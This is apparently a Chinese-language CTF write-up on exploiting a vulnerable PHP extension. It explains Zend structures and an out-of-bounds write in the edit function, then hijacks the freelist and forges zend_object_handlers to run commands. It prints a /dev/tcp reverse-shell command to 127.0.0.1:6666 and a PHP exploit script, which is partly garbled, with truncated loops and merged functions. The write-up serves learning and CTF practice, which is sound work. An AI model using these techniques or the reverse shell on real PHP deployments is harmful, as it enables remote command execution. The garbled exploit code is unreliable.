    #define IS_ALIAS_PTR                14
    #define _IS_ERROR                    15
    /* used for casts */
    #define _IS_BOOL                    17
    #define _IS_NUMBER                    18
根据程序逻辑*（a1+44）是参数个数，zif_wm_add对应的2个参数type值为4、6，即long和string。
以type 6为例，此时的value为zend_string。
    struct _zend_string {
        zend_refcounted_h gc;
        zend_ulong        h;                /* hash value */
        size_t            len;
        char              val[1];
    };
搞清楚变量基本结构之后，php pwn利用经常用到的一个基本变量结构为zend_object:
    struct _zend_object {
        zend_refcounted_h gc;
        uint32_t          handle; // TODO: may be removed ???
        zend_class_entry *ce;
        const zend_object_handlers *handlers;
        HashTable        *properties;
        zval              properties_table[1];
    };
其中包含了一个`zend_object_handlers`，是一个函数指针表，包含了对`zend_object`对象的操作，可以通过伪造一个`zend_object_handlers`，再劫持`zend_object`中的`zend_object_handlers`指针实现利用。
## 逆向分析
结构体：
    struct Cake{
        char *buffer;
        int len;
        int flag;
    }
漏洞在当edit的newSize小于oldSize时，重新申请一块内存但是没有更新size，所以可以越界读写。
           if ( oldSize > newSize )
            {
              _efree();
              v10 = (char *)_emalloc(newSize + 1);
              cakeList[idx].cakeName = v10;
              if ( v10 )
              {
                result = (__int64)strncpy(v10, (const char *)(newbuf + 24), newSize);
                goto LABEL_15;
              }
            }
## 利用分析
复现学习是以venom的wp为依照，按照该思路进行利用。首先申请两个chunk，chunk的大小与zend_object_handlers结构体相同，然后利用漏洞，释放掉后申请的chunk。
然后声明一个php对象，zend_object结构体会在small chunk后，可以越界读泄露heap地址和elf基址。
    $lucky = new Lucky();
    $lucky->a0 = "aaaaaaa";
    $lucky->a1 = function ($x) { };
并且原来被释放的内存区域变为zend_object_handlers。
查看内存，chunk 0x48下方是一个zend_object结构体：
将第一个成员变量赋值为字符串’a’*7，可以看出properties_table中是一个zend_string结构体，查看该处内存：
从最上方内存布局的图中发现，与该成员变量相邻有一个type 为8 的成员变量，即`#define IS_OBJECT
8`，并且该zval的value指向了我们释放的chunk 0x100。
php的空闲内存块管理非常简单，隔size大小有一个next指针指向下一个空闲块，所以通过越界写，劫持另一大小空闲块的next。使得有一个指向zend_object_handlers块的指针，目的是读取其中内容在可控堆块中伪造该结构体。
然后利用与zend_object相邻的堆块越界写，劫持type 8
的zval结构体中的value指针，指向前面伪造的可控堆块，然后在可控堆块中伪造命令执行函数指针，即可通过`($lucky->a1)($cmd);`执行任意命令。
此时内存如图：
在该地址下断点，当执行`($lucky->a1)($cmd);`时：
    $cmd =  '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
    ($lucky->a1)($cmd);
成功反弹shell：
还有一种做法是劫持libc中efree_got，就有点像libc pwn，就不分析了。
## 总结
深入学习之后觉得与其他的pwn并没有太大区别，学无止境，继续努力吧。
## exp
    >= 8;
            }
            return $out;
        }
        function write(&$str, $p, $v, $n = 8) {
            $i = 0;
            for($i = 0; $i >= 8;
            }
        }
        function str2ptr(&$str, $p = 0, $s = 8) {
            $address = 0;
            for($j = $s-1; $j >= 0; $j--) {
                $address = 0; --$i) {
                $tmp = ord(wm_get_byte($idx, $offset+$i));
                $address >= 8;
            }
        }
        class Lucky{
          public    $a0, $a1;
       }
        $str = str_repeat('B', (0x100));
        welcome_to_wmctf();
        wm_add(4, $str);
        wm_add(0, $str);
        $str1 = str_repeat('B', (0x47));
        wm_edit(0, $str1);
        $lucky = new Lucky();
        $lucky->a0 = "aaaaaaa";
        $lucky->a1 = function ($x) { };
        $object_addr = get_bytes(0, 0x88, 8);
        $elf_addr = get_bytes(0, 0x68, 8)-0xa6620-0x1159000;
        echo "object_addr ==> 0x".dechex($object_addr)."\n";
        echo "elf_addr ==> 0x".dechex($elf_addr)."\n";
        wm_add(1, $str);
        wm_edit(1, "A");
        edit_bytes(1, 8, 8, $object_addr);#chunk 0
        wm_add(2, "A");
        wm_add(3, $str); 
        wm_edit(3, ptr2str(1, 1));# chunk3 = chunk0
        for($i = 0; $i &/dev/tcp/127.0.0.1/6666 0>&1"';
        ($lucky->a1)($cmd);
    ?>
## 参考
比较详细的介绍了环境搭建的过程
https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/Sy7hS9bBS?type=view
详细介绍了php变量基本结构
[https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247496630&idx=1&sn=f17c447a3f71d5749c88d58e69b28a4b](https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247496630&idx=1&sn=f17c447a3f71d5749c88d58e69b28a4b)  
venom wp